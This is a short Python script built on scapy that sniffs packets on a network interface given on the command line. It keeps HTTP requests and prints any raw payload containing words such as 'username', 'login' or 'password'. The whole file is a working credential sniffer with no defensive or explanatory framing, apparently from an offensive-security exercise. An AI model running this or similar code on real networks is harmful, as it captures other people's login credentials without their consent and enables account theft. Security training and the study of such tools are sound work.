#!/usr/bin/env python
import scapy.all as scapy
import argparse
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="interface")
    options = parser.parse_args()
    if not options.interface:
        parser.error("Please specify an interface")
    return options

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "uname","password", "pass", "pswrd"]

            for keyword in keywords:
                if keyword in load:
                    print(load)




options = get_arguments()
sniff(options.interface)
